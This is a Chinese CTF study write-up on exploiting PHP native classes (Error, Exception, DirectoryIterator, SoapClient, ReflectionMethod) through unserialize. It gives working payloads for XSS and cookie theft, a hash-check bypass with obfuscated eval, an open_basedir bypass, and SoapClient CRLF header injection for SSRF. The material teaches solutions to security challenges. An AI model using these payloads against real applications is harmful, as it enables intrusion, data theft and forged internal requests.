# 前言

封寝准备CISCN，打完这次CISCN就去实习了。等打完比赛就暂时把CTF放一边，当了三年的CTF赛狗，先把实习要求的内容进行一次学习。（主要偏CTF，研究较少）。

# PHP原生类学习

## 查看各方法的内置类

通过这段代码查看方法的类，这里看到__toString方法对应的Error类

    
    
    <?php
    classes = get_declared_classes();
    foreach ($classes as $class) {
        	$methods = get_class_methods($class);
        	foreach ($methods as $method) {
            	if (in_array($method, array(
            		'__destruct',
            	    '__toString',
                '__wakeup',
                '__call',
                '__callStatic',
                '__get',
                '__set',
                '__isset',
                '__unset',
                '__invoke',
                '__set_state'    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类
            ))) {
                print $class . '::' . $method . "\n";
            }
        }
    }
    

![1651559702916.png](https://image.3001.net/images/20220503/1651565197_6270e28d237c75bf170b7.png!small)

## 利用Error/Exception内置类进行XSS

 **Error类**

1.利用条件

> php7以上  
> 开启报错情况下

Error类是php的一个常见类，用于自定义一个Error，当用户输入错误的值，回显Error页面，php7版本会存在类似的XSS漏洞。Error::__toString，Error类存在__toString的方法，该方法进行类当作字符串进行回应，也就是echo
$l3ife会显示什么。php对象当作一个字符串输出（echo $l3ife）会触发to_String方法。一般用于反序列化漏洞和XSS漏洞。

本地创建error.php(php版本设置为7.0)

    
    
    <?php
    highlight_file('2.php');
    $a = unserialize($_GET['cmd']);
    echo $a;
    ?> 
    

这段反序列化函数，并不存在自定义类，不可以打反序列化，可以用php反序列化的php内置类

    
    
    POC：
    <?php	
    $a=new Error("<script>alert('xss')</script>");
    $b = serialize($a);
    echo urlencode($b);  ?>
    
    

这样就构成XSS漏洞，也可以获得COOKIE信息。

 **Exception类**  
1.利用条件

> php5、php7  
> 开启报错的情况下

本地创建2.php的文件

    
    
    <?php
    highlight_file('2.php');
    $a = unserialize($_GET['cmd']);
    echo $a;
    ?> 
    

POC

    
    
    <?php
    $a = new Exception("<script>alert('xss')</script>");
    $b = serialize($a);
    echo urlencode($b);  ?>
    

**[BJDCTF 2nd]xss之光**  
通过git拿到源码

    
    
    <?php 
    $a = $_GET['yds_is_so_beautiful'];
    Echo unserialize($a);
    

给了GET传参，进行反序列化，不知道怎么自定义类，遇到了反序列化没有POP链的情况。只能通过php内置类进行反序列化，又存在echo，可以用__toString方法返回对象进行反序列化。该题为XSS之光，所以可以通过XSS拿出FLAG。

思路：flag一般在COOKIE的信息里。

    
    
    <?php
    $poc=new	Exception("<script>alert(document.cookie)</script>");
    Echo urlencode(serialize($poc));?>
    反弹cookie
    

将得到的结果传入  
/?yds_is_so_beautiful=$POC

## 利用Error/Exception 内置类绕过哈希比较

测试代码

    
    
    <?php
    $a = new Error("payload",1);
    echo $a;
    

发现会以字符串进行输出，包括当前的错误信息payload以及报错的行号2，传入 Error("payload",1) 中的错误代码“1”则没有输出出来。

    
    
    <?php
    $a = new Error("payload",1);
    $b = new Error("payload",2);
    echo $a;
    echo "\r\n\r\n";
    echo $b;
    

输出

    
    
    Error: payload in D:\phpstudy_pro\WWW\test.php:2
    Stack trace:
    #0 {main}
    
    Error: payload in D:\phpstudy_pro\WWW\test.php:2
    Stack trace:
    #0 {main}
    

$a 和 $b 这两个错误对象本身是不同的，但是 __toString 方法返回的结果是相同的。  
可以利用这个方法果然哈希比较。

 **[2020 极客大挑战]Greatphp**  
考点：php内置绕过哈希比较、php取反绕过

    
    
    <?php
    error_reporting(0);
    class SYCLOVER {
        public $syc;
        public $lover;
    
        public function __wakeup(){
            if(($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
               if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
                   eval($this->syc);
               } else {
                   die("Try Hard !!");
               }
               
            }
        }
    }
    if (isset($_GET['great'])){
        unserialize($_GET['great']);
    } else {
        highlight_file(__FILE__);
    }
    ?>
    

要是常见的php题目，可以数组绕过强类型。在这题目中，需要Error类。

    
    
    if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)))
    

md5()和sha1()可以对一个类进行hash，并且会触发这个类的 __toString 方法；且当eval()函数传入一个类对象时，也会触发这个类里的
__toString 方法。  
![1651561614728.png](https://image.3001.net/images/20220503/1651565200_6270e2907fb63847d14ae.png!small)  
还需要过滤掉小括号和引号  
进行php取反

    
    
    C:\Users\Administrator>php -r "echo urlencode(~'phpinfo');"
    %8F%97%8F%96%91%99%90
    
    
    
    Payload:?code=(~%8F%97%8F%96%91%99%90)();
    
    
    
    将EXP写入
    $cmd='/flag';
    $cmd=urlencode(~$cmd);
    $str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";
    $a=new Error($str,1);
    $b=new Error($str,2);
    $c = new SYCLOVER();
    $c->syc = $a;
    $c->lover = $b;
    echo(urlencode(serialize($c)));
    ?>
    

![1651561796309.png](https://image.3001.net/images/20220503/1651565207_6270e29721291aefa2859.png!small)

![1651561818071.png](https://image.3001.net/images/20220503/1651565208_6270e298bc960406b2514.png!small)

## 利用Directorylterator和Filesystemlterator内置类读取文件

这两个内置类可以进行读取文件

Directorylterator

> 版本：php5、php7、php8  
> Filesystemlterator  
> 版本：PHP 5 >= 5.3.0, PHP 7, PHP 8

 **Directorylterator**

    
    
    <?php 
    highlight_file(__file__); 
    $dir=$_GET['cmd']; 
    $a=new DirectoryIterator($dir); 
    foreach($a as $f){ 
        echo($f -> __toString()."<br>"); 
         
    } 
    ?> 
    

![1651562075427.png](https://image.3001.net/images/20220503/1651565209_6270e2997f5f3e4e0792b.png!small)查看该类，发现__toString()方法
![1651562101506.png](https://image.3001.net/images/20220503/1651565216_6270e2a0bb1f9a40a8c83.png!small)会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的
__toString() 方法，输出指定目录里面经过排序之后的第一个文件名 配合glob://协议使用模式匹配来寻找我们想要的文件路径 ```

**Filesystemlterator**

    
    
    <?php
    $dir=new Filesystemlterator("glob:///flag");
    Echo $dir;
    

## 突破open_basedir的限制

这里看ctfshow web74

    
    
    error_reporting(0); 
    ini_set('display_errors', 0); // 你们在炫技吗？ 
    if(isset($_POST['c'])){ 
    $c=$_POST['c']; 
    eval($c);
    $s=ob_get_contents();
    ob_end_clean();
    echo preg_replace("/[0-9]|[a-z]/i","?",$s); 
    }else{ 
    highlight_file(__FILE__); } ?>
    
    Payload?c=$a=newDirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}exit();
    

![1651562345545.png](https://image.3001.net/images/20220503/1651565219_6270e2a3030fc53038f9e.png!small)绕过了open_basedir限制，信息泄露
接着包含一下 >c=include('/flagx.txt');exit();

## 利用SoapClient类进行SSRF

soapClient：专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。  
类介绍：

    
    
    SoapClient {
    	/* 方法 */
    	public __construct ( string|null $wsdl , array $options = [] )
    	public __call ( string $name , array $args ) : mixed
    	public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
    	public __getCookies ( ) : array
    	public __getFunctions ( ) : array|null
    	public __getLastRequest ( ) : string|null
    	public __getLastRequestHeaders ( ) : string|null
    	public __getLastResponse ( ) : string|null
    	public __getLastResponseHeaders ( ) : string|null
    	public __getTypes ( ) : array|null
    	public __setCookie ( string $name , string|null $value = null ) : void
    	public __setLocation ( string $location = "" ) : string|null
    	public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
    	public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &$outputHeaders = null ) : mixed}
    

存在_ _call方法，当__call方法被触发，可以发送HTTP和HTTPS请求。使得 SoapClient 类可以被我们运用在 SSRF
中。而__call触发很简单，就是当对象访问不存在的方法的时候就会触发。

    
    
    函数形式：
    	public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
    第一个参数为指明是否为wsdl模式，为null则为非wsdl模式
    wsdl，就是一个xml格式的文档，用于描述Web Server的定义
    第二个参数为array，wsdl模式下可选；非wsdl模式下，需要设置location和uri，location就是发送SOAP服务器的URL，uri是服务的命名空间
    

**CTFSHOW web259测试**  
Flag.php

    
    
    if($ip!=='127.0.0.1'){
    	die('error');
    }else{
    	$token = $_POST['token'];
    	if($token=='ctfshow'){
    		file_put_contents('flag.txt',$flag);
    	}
    }
    

需要伪造IP为127.0.0.1.post传参token为ctfshow。就会将flag值写入flag.txt

Index.php

    
    
    <?php
    highlight_file(__FILE__);
    
    $vip = unserialize($_GET['vip']);
    //vip can get flag one key
    $vip->getFlag();
    

传入vip参数并且反序列化，调用getFlag方法，但是找不到谁调用了，如果调用未知的方法，会默认调用php原生类的方法。该题是php原生类的SSRF考点。

本地开启phpstudy测试,创建2.php  
注意：只开启nginx，且把php.ini文件里的

> extension=php_soap.dll  
> soap.wsdl_cache_enabled=0  
> soap.wsdl_cache_ttl=0
    
    
    <?php
    $client=new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1:9999/ctfshow'));
    
    $client->getFlag();
    

uri为服务命名空间，location为发送给服务器的URL地址

并在本地监听9999端口  
![1651563393168.png](https://image.3001.net/images/20220503/1651565221_6270e2a5869d47c95f9d5.png!small)  
访问localhost/2.php，监听数据得到数据包  
![1651563411567.png](https://image.3001.net/images/20220503/1651565222_6270e2a6304330243b06a.png!small)  
得到响应包，Location提交的ctfshow在POST那，需要提交一个post参数。并且可控制的参数为SOAPAction、UA。

进行伪造UA，前提提示token=ctfshow，content-Type长度有13个,试着获得flag.php

    
    
    <?php
    $ua="ctfshow\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\ntoken=ctfshow";
    $client=new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1:9999/flag.php','user_agent'=>$ua));
    
    $client->getFlag();
    

监听查看，发现修改成功  
![1651563475588.png](https://image.3001.net/images/20220503/1651565224_6270e2a8563f7ec0739ab.png!small)  
Content-type发现长度token=ctfshow为13时，就把后面的丢弃。

注意flag.php还存在这段代码

    
    
    $xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    array_pop($xff);
    $ip = array_pop($xff);
    

进行分割数组，并且删除两次数组后面的元素。  
所以我们需要插入三个127.0.0.1

    
    
    <?php
    $ua="ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\ntoken=ctfshow";
    $client=new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1:9999/flag.php','user_agent'=>$ua));
    
    $client->getFlag();
    

得到以下数据  
![1651563626841.png](https://image.3001.net/images/20220503/1651565226_6270e2aadc9c52e214547.png!small)  
修改2.php,测试端口我们选择9999，服务器端口为80；进行序列化。  
![1651563644286.png](https://image.3001.net/images/20220503/1651565229_6270e2ad557ca99a1c95c.png!small)  
![1651563659674.png](https://image.3001.net/images/20220503/1651565233_6270e2b18844465fffa72.png!small)  
这需要两个换行，我一直填一个，导致http包闭合了。  
![1651563726210.png](https://image.3001.net/images/20220503/1651565234_6270e2b29053116a1afb9.png!small)

## 利用ReflectionMethod读取User类的方法

 **ReflectionMethod类**  
ReflectionMethod的类报告了方法的相关信息

> 版本：(PHP 5, PHP 7, PHP 8)

类的方法

    
    
    ReflectionMethod::__construct — ReflectionMethod 的构造函数
    ReflectionMethod::export — 输出一个回调方法
    ReflectionMethod::getClosure — 返回一个动态建立的方法调用接口，译者注：可以使用这个返回值直接调用非公开方法。
    ReflectionMethod::getDeclaringClass — 获取被反射的方法所在类的反射实例
    ReflectionMethod::getModifiers — 获取方法的修饰符
    ReflectionMethod::getPrototype — 返回方法原型 (如果存在)
    ReflectionMethod::invoke — Invoke
    ReflectionMethod::invokeArgs — 带参数执行
    ReflectionMethod::isAbstract — 判断方法是否是抽象方法
    ReflectionMethod::isConstructor — 判断方法是否是构造方法
    ReflectionMethod::isDestructor — 判断方法是否是析构方法
    ReflectionMethod::isFinal — 判断方法是否定义 final
    ReflectionMethod::isPrivate — 判断方法是否是私有方法
    ReflectionMethod::isProtected — 判断方法是否是保护方法 (protected)
    ReflectionMethod::isPublic — 判断方法是否是公开方法
    ReflectionMethod::isStatic — 判断方法是否是静态方法
    ReflectionMethod::setAccessible — 设置方法是否访问
    ReflectionMethod::__toString — 返回反射方法对象的字符串表达
    

**[第十四届全国信息安全竞赛]easy_resource**  
扫描得到index.php.swo

    
    
    <?php
    class User
    {
        private static $c = 0;
    
        function a()
        {
            return ++self::$c;
        }
    
        function b()
        {
            return ++self::$c;
        }
    
        function c()
        {
            return ++self::$c;
        }
    
        function d()
        {
            return ++self::$c;
        }
    
        function e()
        {
            return ++self::$c;
        }
    
        function f()
        {
            return ++self::$c;
        }
    
        function g()
        {
            return ++self::$c;
        }
    
        function h()
        {
            return ++self::$c;
        }
    
        function i()
        {
            return ++self::$c;
        }
    
        function j()
        {
            return ++self::$c;
        }
    
        function k()
        {
            return ++self::$c;
        }
    
        function l()
        {
            return ++self::$c;
        }
    
        function m()
        {
            return ++self::$c;
        }
    
        function n()
        {
            return ++self::$c;
        }
    
        function o()
        {
            return ++self::$c;
        }
    
        function p()
        {
            return ++self::$c;
        }
    
        function q()
        {
            return ++self::$c;
        }
    
        function r()
        {
            return ++self::$c;
        }
    
        function s()
        {
            return ++self::$c;
        }
    
        function t()
        {
            return ++self::$c;
        }
    }
    $rc=$_GET["rc"];
    $rb=$_GET["rb"];
    $ra=$_GET["ra"];
    $rd=$_GET["rd"];
    $method= new $rc($ra, $rb);
    var_dump($method->$rd());
    

考虑利用原生类 ReflectionMethod 读取 User 类中的方法

构造Payload

> ?rc=ReflectionMethod&ra=User&ra=User&rb=

rb取a-z。进行burp爆破  
![1651564278329.png](https://image.3001.net/images/20220503/1651565235_6270e2b31bea37bb1e1a1.png!small)

# 参考文档

https://www.codetd.com/article/13648456  
https://xz.aliyun.com/t/9293

